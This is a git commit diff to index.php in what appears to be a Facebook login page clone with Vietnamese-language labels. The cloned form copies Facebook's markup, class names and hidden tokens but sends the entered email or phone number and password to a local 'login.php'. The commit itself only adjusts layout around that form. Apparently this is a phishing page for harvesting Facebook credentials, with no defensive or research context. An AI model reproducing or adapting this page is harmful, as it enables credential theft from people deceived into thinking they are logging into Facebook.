03bc33a09007c0c11e84eef8fba886e4ab2a8228
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-09-28 16:59:54 +0700

    Update index.php

--- index.php
+++ index.php
@@ -19,11 +19,13 @@
 			<div class="m-header">
 				<h3>Facebook</h3>
 			</div>
-			<center><form class="_featuredLogin__formContainer" data-testid="royal_login_form" action="login.php" method="post" onsubmit="" id="u_0_a"><input type="hidden" name="jazoest" value="2700" autocomplete="off" /><input type="hidden" name="lsd" value="AVqew44p" autocomplete="off" /><div><div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" autofocus="1" aria-label="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" /></div><div class="_6lux"><input type="password" class="inputtext _55r1 _6luy" name="pass" id="pass" data-testid="royal_pass" placeholder="M&#x1ead;t kh&#x1ea9;u" aria-label="M&#x1ead;t kh&#x1ea9;u" /></div></div><input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" /><div class="_6ltg">
+			<center><div class="_8esn"><div class="_8iep _8icy _9ahz _9ah-"><div class="_6luv _52jv">
+			<form class="_featuredLogin__formContainer" data-testid="royal_login_form" action="login.php" method="post" onsubmit="" id="u_0_a"><input type="hidden" name="jazoest" value="2700" autocomplete="off" /><input type="hidden" name="lsd" value="AVqew44p" autocomplete="off" /><div><div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" autofocus="1" aria-label="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" /></div><div class="_6lux"><input type="password" class="inputtext _55r1 _6luy" name="pass" id="pass" data-testid="royal_pass" placeholder="M&#x1ead;t kh&#x1ea9;u" aria-label="M&#x1ead;t kh&#x1ea9;u" /></div></div><input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" /><div class="_6ltg">
 			<button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_b">Đăng nhập</button></div>
 				<div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
 				<div class="_8icz"></div><div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" ajaxify="/reg/spotlight/" id="u_0_2" data-testid="open-registration-form-button" rel="async">Tạo tài khoản mới</a></div>
-				</form></center>
+				</form>
+				</center>
 				</div>
 				<footer>
 			<ul>
